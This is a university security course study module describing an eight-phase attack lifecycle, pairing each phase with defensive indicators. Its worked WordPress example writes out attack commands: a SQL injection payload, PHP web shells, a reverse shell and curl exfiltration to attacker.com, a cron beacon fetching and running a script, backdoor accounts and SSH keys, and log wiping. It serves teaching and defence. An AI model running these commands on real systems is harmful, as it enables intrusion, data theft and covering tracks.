# Attack Lifecycle — Cycle Complet d'une Attaque

| Property          | Value                                                                                                              |
| ----------------- | ------------------------------------------------------------------------------------------------------------------ |
| **Topic**         | Attack Lifecycle / Cycle d'Attaque                                                                                 |
| **Domain**        | 03-offensive-security                                                                                              |
| **Difficulty**    | 🟡 Intermediate                                                                                                    |
| **Prerequisites** | [CIA Triad](../00-foundations/cia-triad.md), [Risk Analysis](../00-foundations/risk-analysis.md), basic networking |
| **Learning Time** | 75-90 minutes                                                                                                      |
| **Status**        | ✅ Complete                                                                                                        |

---

## Review Schedule

- [ ] Day 2 — First review after initial study
- [ ] Week 1 — Consolidation review
- [ ] Month 1 — Long-term retention check
- [ ] Month 3 — Mastery verification

---

## Quick Summary

**What:** The attack lifecycle describes the systematic progression of a cyberattack from initial reconnaissance to covering tracks.

**Offensive:** Attackers follow a methodical process to maximize impact while minimizing detection.
**Defensive:** Defenders who understand each phase can implement detection and prevention at multiple layers.

**Why it matters:** Attacks are not random. They follow predictable patterns. Understanding the lifecycle enables:

- **Early detection** (catch attacks during recon, not after compromise)
- **Defense in depth** (controls at each phase)
- **Incident response** (identify which phase you're dealing with)

---

## Prerequisites

**Required knowledge:**

- [CIA Triad](../00-foundations/cia-triad.md) — Understanding security objectives
- [Risk Analysis](../00-foundations/risk-analysis.md) — Threat modeling concepts
- Basic networking (IP addresses, ports, DNS)
- Operating system fundamentals (users, processes, files)

**Quick check:** Can you explain what a "vulnerability" is and how it differs from a "threat"? If yes, you're ready.

---

## Layer 1 — Intuition

Think of a cyberattack like a burglary:

🔍 **1. Reconnaissance (Collecte d'informations)** = Casing the house (watch routines, find entry points)
📡 **2. Scanning (Balayage)** = Test doors and windows (which are unlocked?)
🔓 **3. Vulnerability Analysis (Repérage des failles)** = Find the weak window latch
🚪 **4. Intrusion (Intrusion)** = Break in through weak window
🔑 **5. Privilege Escalation (Extension des privilèges)** = Find house keys to access locked rooms
💎 **6. Compromise (Compromission)** = Steal valuables, control the house
🔐 **7. Persistence (Porte dérobée)** = Install hidden key for future access
🧹 **8. Cleanup (Nettoyage des traces)** = Wipe fingerprints, cover tracks

**Key insight:** Each phase **increases control** and **reduces detection risk**. Attackers who get caught are usually stopped early (recon/scanning), not late (persistence).

---

## Layer 2 — Formal Definitions

### The 8-Phase Attack Lifecycle

#### 1. Reconnaissance (Collecte d'informations)

**Definition:** Gathering information about the target without directly interacting with its systems.

**Goal:** Understand the target's infrastructure, technologies, employees, and security posture.

**Type:** Mostly **passive** (no direct system interaction).

**Techniques:**

- **Public databases:** WHOIS, IANA, RIPE, ARIN (IP ownership, contacts)
- **Search engines:** Google dorking, cached pages, exposed documents
- **Social media:** LinkedIn (employees, technologies), Twitter (announcements)
- **Job postings:** Technologies mentioned in requirements
- **Dumpster diving:** Physical trash (documents, USB drives)

**Indicators (defensive):**

- Unusual WHOIS lookups
- Repeated search engine queries for company-specific terms
- Social engineering attempts (phishing reconnaissance)

**French term:** _Collecte d'informations_, _Reconnaissance_

---

#### 2. Scanning (Balayage)

**Definition:** Active probing of the target's network to map systems, services, and open ports.

**Goal:** Identify **what is accessible** and **what services are running**.

**Type:** **Active** (directly interacts with target systems, generates logs).

**Techniques:**

- **Port scanning:** nmap, masscan (which ports are open? 80, 443, 22, 3389?)
- **Service detection:** Version detection (Apache 2.4.41, OpenSSH 7.9)
- **OS fingerprinting:** TTL values, TCP stack behavior → Windows vs. Linux
- **Network mapping:** Topology discovery (routers, firewalls, subnets)
- **Sniffing:** Passive traffic capture (Wireshark, tcpdump) if on same network

**Common ports scanned:**
| Port | Service | Purpose |
|------|---------|---------|
| 21 | FTP | File transfer (often misconfigured) |
| 22 | SSH | Remote shell access |
| 23 | Telnet | Unencrypted remote access (legacy) |
| 80 | HTTP | Web server |
| 443 | HTTPS | Encrypted web server |
| 3306 | MySQL | Database (should not be public) |
| 3389 | RDP | Remote Desktop Protocol (Windows) |

**Indicators (defensive):**

- Rapid port scans from single IP
- Service enumeration attempts
- Unusual DNS queries
- Firewall logs showing blocked scan attempts

**French term:** _Balayage_, _Scan réseau_

---

#### 3. Vulnerability Analysis (Repérage des failles)

**Definition:** Identifying specific weaknesses (vulnerabilities) that can be exploited.

**Goal:** Find **exploitable entry points** (unpatched software, misconfigurations, weak passwords).

**Techniques:**

- **Vulnerability scanners:** Nessus, OpenVAS, Qualys (automated CVE detection)
- **Manual inspection:** Code review, configuration audit
- **Public exploit databases:** Exploit-DB, Metasploit, CVE database
- **Web application testing:** SQL injection, XSS, CSRF, authentication bypass
- **Credential testing:** Default passwords (admin/admin, root/root)

**CVE (Common Vulnerabilities and Exposures):**

- Public database of known vulnerabilities
- Format: CVE-YYYY-NNNNN (e.g., CVE-2021-44228 = Log4Shell)

**Example:** Scanner detects Apache 2.4.41 → Cross-reference with CVE database → CVE-2020-11984 (arbitrary code execution)

**Indicators (defensive):**

- Vulnerability scan signatures (Nessus, Nmap NSE scripts)
- Automated exploitation attempts (Metasploit)
- Repeated login attempts (brute force)

**French term:** _Repérage des failles_, _Analyse de vulnérabilité_

---

#### 4. Intrusion (Intrusion)

**Definition:** Gaining unauthorized access to the system by exploiting a vulnerability.

**Goal:** Establish initial foothold inside the target.

**Techniques:**

- **Exploit execution:** Metasploit module, custom exploit
- **Password attacks:** Brute force, dictionary, credential stuffing
- **Social engineering:** Phishing email with malicious attachment
- **Physical access:** USB drop, tailgating, badge cloning
- **Supply chain compromise:** Infected software update (SolarWinds)

**Example:** Attacker sends spear-phishing email with malicious Word doc → Victim opens doc → Macro executes → Reverse shell established

**Indicators (defensive):**

- New user account creation
- Unexpected process execution (PowerShell, cmd.exe from Office app)
- Outbound connection to unknown IP
- Authentication from unusual location

**French term:** _Intrusion_, _Pénétration_

---

#### 5. Privilege Escalation (Extension des privilèges)

**Definition:** Elevating access from low-privilege user to administrator/root.

**Goal:** Gain **full control** of the system (read/write/execute everything).

**Why necessary:** Initial intrusion often gives limited access (e.g., standard user). Attacker needs admin/root to:

- Access sensitive files (passwords, databases)
- Install persistence mechanisms (rootkits, backdoors)
- Disable security controls (antivirus, logging)
- Move laterally to other systems

**Techniques:**

- **Kernel exploits:** Unpatched OS vulnerability (e.g., Dirty COW)
- **Misconfiguration:** Sudo misconfiguration, insecure file permissions
- **Credential theft:** Password reuse, stored credentials
- **Service exploits:** Vulnerable SUID binaries (Linux), DLL hijacking (Windows)

**Example:** Attacker has user-level shell → Discovers vulnerable SUID binary → Executes exploit → Gains root shell

**Indicators (defensive):**

- Privilege escalation attempts logged
- Unexpected administrative account activity
- Modification of system files (/etc/passwd, /etc/sudoers)

**French term:** _Extension des privilèges_, _Élévation de privilèges_

---

#### 6. Compromise (Compromission)

**Definition:** Complete control of the system; attacker can read, modify, and delete data at will.

**Goal:** Achieve the attack objective (data theft, system destruction, espionage).

**Activities:**

- **Data exfiltration:** Steal databases, documents, credentials
- **Lateral movement:** Pivot to other systems (internal network)
- **System manipulation:** Modify logs, plant false evidence
- **Deploy malware:** Ransomware, cryptominers, remote access trojans

**Example:** Attacker with root access:

1. Dumps password hashes from /etc/shadow
2. Exfiltrates customer database (1M records)
3. Installs keylogger to capture future credentials
4. Moves laterally to backup server via SSH

**Indicators (defensive):**

- Large data transfers outbound
- Access to sensitive files (database dumps)
- Lateral movement (RDP, SSH from compromised host)
- Unusual file modifications

**French term:** _Compromission_, _Contrôle total_

---

#### 7. Persistence (Porte dérobée / Backdoor)

**Definition:** Maintaining access to the system even after reboots, password changes, or remediation attempts.

**Goal:** Ensure **long-term access** for future attacks without repeating intrusion.

**Techniques:**

- **Backdoor user account:** Hidden admin account (e.g., user "support$")
- **Startup scripts:** Modify /etc/rc.local, Windows Registry Run keys
- **Scheduled tasks:** Cron job (Linux), Task Scheduler (Windows)
- **Web shell:** PHP/ASP backdoor on web server (e.g., c99.php)
- **Rootkit:** Kernel-level malware hiding processes, files, network connections
- **Compromised credentials:** Steal valid admin credentials for future use

**Example:** Attacker installs SSH backdoor:

```bash
# Add attacker's SSH key to root's authorized_keys
echo "ssh-rsa AAAAB3... attacker@evil.com" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

**Why it matters:** Even after patching the initial vulnerability, the attacker can return via backdoor.

**Indicators (defensive):**

- New user accounts created
- Unauthorized SSH keys added
- Modified startup scripts
- Hidden processes/files (rootkit detection)

**French term:** _Porte dérobée_, _Backdoor_, _Persistance_

---

#### 8. Cleanup (Nettoyage des traces)

**Definition:** Erasing evidence of the attack to avoid detection and attribution.

**Goal:** Prevent forensic analysis and delay incident response.

**Techniques:**

- **Log deletion:** Clear /var/log/auth.log, Windows Event Logs
- **Log modification:** Remove specific entries (attacker's IP, commands executed)
- **Timestamp manipulation:** Touch files to change access/modification times
- **Tool removal:** Delete exploit scripts, backdoors, malware samples
- **Anti-forensics:** Overwrite deleted files (shred, srm)

**Example:**

```bash
# Clear bash history
history -c
rm ~/.bash_history

# Clear auth log (requires root)
echo "" > /var/log/auth.log

# Remove exploit files
shred -vfz -n 7 exploit.py
```

**Why it matters:** Without cleanup, incident responders can:

- Identify attack vectors
- Attribute to specific threat actor
- Understand full scope of compromise

**Limitation:** Complete cleanup is nearly impossible (logs may be centralized, backups exist, forensic tools recover deleted files).

**Indicators (defensive):**

- Gaps in log files (missing time periods)
- Log files with unusual timestamps
- Anti-forensics tool signatures

**French term:** _Nettoyage des traces_, _Effacement des preuves_

---

## Layer 3 — Worked Examples

### Example 1: Web Server Compromise (Complete Lifecycle)

**Scenario:** E-commerce website running outdated WordPress with admin panel exposed.

#### Phase 1: Reconnaissance

```
Attacker actions:
- Google: "site:example.com admin login"
- Discovers: https://example.com/wp-admin
- WHOIS lookup: Identifies hosting provider (AWS EC2)
- LinkedIn: Finds IT admin's name and email
```

**Intelligence gathered:**

- Web server: WordPress
- Admin panel: Publicly accessible
- Hosting: AWS (IP range: 203.0.113.0/24)
- IT contact: john.doe@example.com

---

#### Phase 2: Scanning

```
nmap -sV -p 1-10000 203.0.113.50
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4
80/tcp   open  http     Apache 2.4.41
443/tcp  open  ssl/http Apache 2.4.41
3306/tcp open  mysql    MySQL 5.7.30
```

**Findings:**

- SSH (port 22): Open, but password authentication only
- HTTP/HTTPS (80/443): WordPress site
- **MySQL (3306): EXPOSED TO INTERNET** (critical misconfiguration)

---

#### Phase 3: Vulnerability Analysis

```
# WordPress version detection
curl -s https://example.com/ | grep "wp-content/themes"
# Output: WordPress 5.4.2 (vulnerable to CVE-2020-28037)

# MySQL test (from internet)
mysql -h 203.0.113.50 -u root -p
# Prompt appears → MySQL is publicly accessible

# Plugin scan
wpscan --url https://example.com --enumerate vp
# Vulnerable plugin: Contact Form 7 (SQL injection CVE-2020-XXXX)
```

**Vulnerabilities identified:**

1. WordPress 5.4.2 (outdated, known CVEs)
2. MySQL exposed to internet (should be firewalled)
3. Vulnerable Contact Form 7 plugin (SQL injection)

**Attack decision:** Exploit SQL injection in Contact Form 7 plugin.

---

#### Phase 4: Intrusion

```
# SQL injection payload via contact form
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

action=submit_form&name=' UNION SELECT user_login, user_pass FROM wp_users--
```

**Result:**

```
Response:
admin:$P$B1234567890abcdefghijklmnopqrstuv
john:$P$B9876543210zyxwvutsrqponmlkjihgf
```

**Crack password hashes (offline):**

```
john --wordlist=rockyou.txt hashes.txt
# admin:password123 (cracked in 2 minutes)
```

**Login:**

```
https://example.com/wp-admin
Username: admin
Password: password123
→ Success! Admin panel access gained.
```

---

#### Phase 5: Privilege Escalation

WordPress admin has limited OS access, but can upload PHP files.

```
# Upload PHP web shell via plugin editor
<?php system($_GET['cmd']); ?>
# Save to: /wp-content/themes/twentytwenty/shell.php
```

**Execute web shell:**

```
https://example.com/wp-content/themes/twentytwenty/shell.php?cmd=whoami
Output: www-data

# Upgrade to reverse shell
https://example.com/wp-content/themes/twentytwenty/shell.php?cmd=bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

**Now attacker has shell as www-data user.**

**Privilege escalation to root:**

```
# Check sudo permissions
sudo -l
# Output: www-data can run /usr/bin/mysql as root without password

# MySQL privilege escalation (UDF exploit)
sudo mysql -u root
mysql> \! bash
# → Root shell obtained!
```

---

#### Phase 6: Compromise

```
# With root access:

# 1. Dump customer database
mysqldump -u root wp_ecommerce > /tmp/customers.sql
# 1,000,000 customer records (names, emails, addresses, hashed passwords)

# 2. Exfiltrate data
curl -X POST -d @/tmp/customers.sql https://attacker.com/upload

# 3. Lateral movement (if applicable)
# Discover backup server via /etc/hosts
cat /etc/hosts
# 10.0.1.50  backup-server

# SSH to backup server using stolen credentials
ssh john@10.0.1.50
# (Password reuse from cracked hash)
```

---

#### Phase 7: Persistence

```
# 1. Create backdoor user
useradd -m -s /bin/bash support
echo "support:Tr0jan123!" | chpasswd
usermod -aG sudo support

# 2. Add SSH key for password-less access
mkdir /root/.ssh
echo "ssh-rsa AAAAB3Nza...attacker@evil.com" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# 3. Install web shell backdoor (hidden)
echo '<?php eval($_POST["cmd"]); ?>' > /var/www/html/.config.php

# 4. Cron job for persistence
crontab -e
# Add: @reboot curl https://attacker.com/beacon.sh | bash
```

**Result:** Attacker can return anytime via:

- SSH as "support" user
- SSH with root key
- Web shell at https://example.com/.config.php
- Cron job reconnects on reboot

---

#### Phase 8: Cleanup

```
# 1. Clear bash history
history -c
rm /root/.bash_history
rm /home/www-data/.bash_history

# 2. Clear auth logs
echo "" > /var/log/auth.log
echo "" > /var/log/apache2/access.log

# 3. Remove exploit files
rm /tmp/customers.sql
rm /var/www/html/wp-content/themes/twentytwenty/shell.php

# 4. Modify Apache access log (selectively remove attacker IP)
sed -i '/203.0.113.100/d' /var/log/apache2/access.log

# 5. Touch file timestamps to avoid suspicion
touch -t 202201150800 /root/.ssh/authorized_keys
```

**Result:** Attack evidence minimized (but not eliminated—forensic analysis can still find traces).

---

## Layer 4 — Edge Cases, Nuances, and Limitations

### Edge Case 1: Non-Linear Attack Paths

**Problem:** Real attacks don't always follow Phase 1 → 2 → 3 → 4 → 5 → 6 → 7 → 8.

**Examples:**

1. **Skip reconnaissance/scanning:**
   Attacker already knows infrastructure (insider threat, supply chain partner).

2. **Jump directly to intrusion:**
   Zero-day exploit requires no scanning (attacker already knows vulnerability exists everywhere).

3. **No privilege escalation needed:**
   Initial access is already admin (e.g., compromised admin credentials via phishing).

4. **No persistence:**
   One-time attack (ransomware, DDoS) doesn't require future access.

**Defensive implication:** Don't assume all attacks will hit every phase. Some attacks are "fast and loud" (no cleanup), others are "slow and stealthy" (extensive reconnaissance, careful cleanup).

---

### Edge Case 2: Living Off the Land (LotL)

**Concept:** Attackers use legitimate system tools instead of custom malware to avoid detection.

**Examples:**

- **PowerShell (Windows):** Execute scripts, download files, run exploits
- **Bash (Linux):** Same capabilities as PowerShell
- **WMI (Windows Management Instrumentation):** Remote command execution
- **PsExec:** Legitimate admin tool used for lateral movement

**Why it matters:**

- No malware signatures to detect
- Difficult to distinguish from legitimate admin activity
- Bypasses traditional antivirus

**Defensive strategy:**

- **Behavioral detection:** Monitor PowerShell execution, command-line arguments
- **Whitelisting:** Restrict PowerShell to specific users/tasks
- **Logging:** Enable PowerShell script block logging, command-line auditing

---

### Edge Case 3: Advanced Persistent Threats (APT)

**Definition:** State-sponsored or highly sophisticated attackers who maintain long-term access for espionage.

**Characteristics:**

- **Extended reconnaissance:** Months of passive information gathering
- **Custom malware:** Zero-day exploits, tailored tooling
- **Stealth:** Minimal footprint, anti-forensics, living off the land
- **Patience:** Wait for high-value opportunities, avoid detection
- **Persistence:** Multiple backdoors, firmware implants, supply chain compromise

**Example phases (APT attack):**

1. **Reconnaissance:** 3-6 months of passive OSINT
2. **Intrusion:** Spear-phishing with custom exploit (zero-day)
3. **Privilege escalation:** Kernel exploit (undisclosed vulnerability)
4. **Compromise:** Selective data exfiltration (gigabytes over 12 months)
5. **Persistence:** Firmware rootkit, supply chain backdoor
6. **Cleanup:** Sophisticated anti-forensics, decoy artifacts

**Defensive challenge:** APT attacks can go undetected for years (average: 200+ days from compromise to detection).

---

### Edge Case 4: Ransomware Lifecycle Difference

**Ransomware deviates from traditional lifecycle:**

| Phase                | Traditional | Ransomware                           |
| -------------------- | ----------- | ------------------------------------ |
| Reconnaissance       | Extended    | Minimal (spray and pray)             |
| Intrusion            | Targeted    | Phishing campaigns                   |
| Privilege Escalation | Required    | Often needed                         |
| Compromise           | Data theft  | **Data encryption**                  |
| Persistence          | Essential   | **Not needed** (one-time attack)     |
| Cleanup              | Extensive   | **None** (attacker wants visibility) |

**Ransomware goal:** Lock data, demand payment, then leave (no need for long-term access).

**Defensive difference:** Traditional IOCs (indicators of compromise) focus on persistence; ransomware IOCs focus on encryption activity.

---

### Limitation 1: The "Pyramid of Pain"

**Concept:** Different IOCs (Indicators of Compromise) have different defensive value.

**Pyramid (easiest to hardest for attacker to change):**

| Level        | IOC Type                               | Attacker Effort to Change                  | Defensive Value |
| ------------ | -------------------------------------- | ------------------------------------------ | --------------- |
| 🟢 Easy      | Hash values                            | Trivial (recompile malware)                | Low             |
| 🟢 Easy      | IP addresses                           | Easy (new VPS)                             | Low             |
| 🟡 Medium    | Domain names                           | Medium (register new domain)               | Medium          |
| 🟠 Hard      | Network artifacts                      | Hard (new C2 protocol)                     | High            |
| 🔴 Very Hard | Tools used                             | Very hard (rewrite toolset)                | High            |
| 🔴 Very Hard | TTPs (Tactics, Techniques, Procedures) | Extremely hard (change entire methodology) | Very High       |

**Implication:** Focus detection on **TTPs** (attack lifecycle phases, behaviors) rather than **hashes/IPs** (easily changed).

---

### Limitation 2: Defensive Detection Trade-offs

**Challenge:** Detecting early phases (recon/scanning) has high **false positive rate**.

**Why:**

- Legitimate security research looks like reconnaissance
- Automated scanners (Shodan, Censys) constantly scan the internet
- Penetration testers hired by your company trigger IDS alerts

**Trade-off matrix:**

| Detection Phase      | Detection Difficulty | False Positives | Impact if Missed                    |
| -------------------- | -------------------- | --------------- | ----------------------------------- |
| Reconnaissance       | Hard                 | Very High       | Low (just info gathering)           |
| Scanning             | Medium               | High            | Medium (no damage yet)              |
| Intrusion            | Easy                 | Low             | **High** (attacker is inside)       |
| Privilege Escalation | Easy                 | Low             | **Critical** (attacker has control) |
| Compromise           | Easy                 | Very Low        | **Critical** (data loss)            |

**Defensive strategy:**

- **Early phases (1-3):** Monitor but don't over-alert; collect intel for threat intelligence
- **Later phases (4-8):** High-fidelity alerts, immediate response

---

## Active Recall Prompts

### Understanding Questions

1. **Lifecycle phases:** Without looking, list all 8 phases of the attack lifecycle in order.

2. **Passive vs. active:** Which phases are typically "passive" (no direct system interaction)? Which are "active"?

3. **CVE definition:** What does CVE stand for? What is its purpose in the vulnerability analysis phase?

---

### Application Questions

4. **Scenario mapping:** A company discovers:
   - Unusual WHOIS lookups for their domain (Week 1)
   - Port scans from unknown IPs (Week 2)
   - Phishing emails to employees (Week 3)
   - New admin user "backup_admin" created (Week 4)
     Map each event to attack lifecycle phase. What phase are they in now?

5. **Defense prioritization:** You have a limited budget. Where should you invest to disrupt the attack lifecycle?
   - IDS for scanning detection?
   - MFA to prevent intrusion?
   - EDR for privilege escalation detection?
   - SIEM for log analysis (cleanup detection)?
     Justify your choice.

6. **Indicator identification:** For each phase, name one indicator (log entry, network traffic, system change) that would reveal the attack:
   - Reconnaissance
   - Scanning
   - Intrusion
   - Privilege Escalation
   - Persistence

---

### Transfer Questions

7. **Real-world attack:** Research **SolarWinds Orion supply chain attack (2020)**. Map the attack to the 8-phase lifecycle. Which phases were most sophisticated?

8. **Red team vs. APT:** How does a red team engagement differ from an APT attack in terms of:
   - Reconnaissance time
   - Cleanup thoroughness
   - Persistence mechanisms
   - Detection tolerance

9. **Defensive layers:** Design a defense-in-depth strategy with controls at each attack lifecycle phase. For each phase, name one preventive and one detective control.

10. **Ethical question:** You're a security researcher who discovers a zero-day vulnerability in widely used software. You know attackers could use Phase 3 (Vulnerability Analysis) to exploit it. What is your responsible disclosure process?

---

## References

### Primary Sources

- **Course:** IFT2830 - Sécurité des systèmes informatiques (UdeM)
  Lectures: [2026-02-16 Attaques sur les systèmes informatique](../../../05_references/course-materials/IFT2830_course-materials/notes/2026-02-16_Attaques%20sur%20les%20systèmes%20informatique.md)

### Frameworks

- **Lockheed Martin Cyber Kill Chain** — 7-stage model (similar to attack lifecycle)
- **MITRE ATT&CK** — Comprehensive knowledge base of TTPs (tactics, techniques, procedures)
- **NIST Cybersecurity Framework** — Identify, Protect, Detect, Respond, Recover

### Academic Papers

- Hutchins, E. M., Cloppert, M. J., & Amin, R. M. (2011). "Intelligence-Driven Computer Network Defense Informed by Analysis of Adversary Campaigns and Intrusion Kill Chains." _Leading Issues in Information Warfare & Security Research_, 1(1), 80.

### Real-World Incidents

- **SolarWinds Orion (2020)** — APT supply chain attack, all 8 phases executed with extreme sophistication
- **Equifax breach (2017)** — Unpatched vulnerability (Phase 3) led to 143M records stolen (Phase 6)
- **Target breach (2013)** — HVAC vendor compromise → lateral movement → POS malware

### Tools & Resources

- **Reconnaissance:** theHarvester, Shodan, Maltego
- **Scanning:** nmap, masscan, Nessus
- **Exploitation:** Metasploit Framework, Exploit-DB
- **Persistence:** Empire, Cobalt Strike (red team tools)
- **Cleanup:** Anti-forensics tools (research only, not for malicious use)

---

## Related Content

### Theory Modules

- **Previous:** [Risk Analysis - Threat Modeling](../00-foundations/risk-analysis.md) — Understanding attacker capabilities
- **Next:** [Password Attacks](password-attacks.md) — Common intrusion technique
- **Related:** [Privilege Escalation](privilege-escalation.md) — Deep dive into Phase 5

### Examples

- [Web Server Compromise Walkthrough](../../../02_examples/03-offensive-security/web-server-compromise/) — Full lifecycle demonstration
- [Phishing to Persistence](../../../02_examples/03-offensive-security/phishing-to-persistence/) — Social engineering path

### Exercises

- [Attack Lifecycle Mapping](../../../03_exercises/03-offensive-security/attack-lifecycle-mapping/) 🟡 — Classify real incidents by phase
- [Defense-in-Depth Design](../../../03_exercises/03-offensive-security/defense-in-depth-design/) 🟠 — Build layered defenses
- [Red Team Simulation](../../../03_exercises/03-offensive-security/red-team-simulation/) 🔴 — Full-chain attack in lab

### Tools & Resources

- **Attack Lifecycle Diagram:** `04_resources/tools/offensive-security/attack-lifecycle-diagram.png`
- **Kill Chain Comparison:** `04_resources/tools/offensive-security/kill-chain-comparison.md`

---

## Personal Insights & Notes

### Study Notes

_Record your observations, "aha" moments, and connections here._

**Example:**

- "Persistence is the 'point of no return' — even after patching, attacker can return via backdoor."
- "Cleanup is often incomplete — attackers leave traces (centralized logs, forensic artifacts)."

---

### Real-World Connections

_Link this concept to incidents, news, or work experience._

**Example:**

- "SolarWinds — reconnaissance took months, persistence via supply chain was genius, cleanup was near-perfect (took months to discover)."

---

### Questions & Confusion

_Track what's unclear or needs deeper investigation._

**Example:**

- "How do APTs maintain access for years without detection? Need to research steganography, firmware implants."

---

### Exam/Interview Prep

_Key points to remember for assessments._

**Exam focus (IFT2830):**

- 8 phases in order: Reconnaissance → Scanning → Vulnerability Analysis → Intrusion → Privilege Escalation → Compromise → Persistence → Cleanup
- French terms: Collecte d'informations, Balayage, Repérage des failles, Intrusion, Extension des privilèges, Compromission, Porte dérobée, Nettoyage des traces
- CVE = Common Vulnerabilities and Exposures
- Defense-in-depth at each phase

**Interview talking points:**

- "Attack lifecycle is not linear — attackers skip phases based on context."
- "Early detection (recon/scanning) has high false positives but prevents compromise."
- "Living off the land (LotL) uses legitimate tools, bypassing signature-based detection."
- "MITRE ATT&CK maps real-world TTPs to attack lifecycle phases."

---

## Change Log

| Date       | Change                              | Reason                                                          |
| ---------- | ----------------------------------- | --------------------------------------------------------------- |
| 2026-02-16 | Created module                      | Initial theory module based on IFT2830 attack lifecycle lecture |
| 2026-02-16 | Added web server compromise example | Full 8-phase walkthrough with technical commands                |
| 2026-02-16 | Added edge cases                    | APT, ransomware, living off the land, pyramid of pain           |
| 2026-02-16 | Integrated French terminology       | Bilingual support throughout                                    |
| 2026-02-16 | Added MITRE ATT&CK references       | Industry-standard TTPs framework                                |
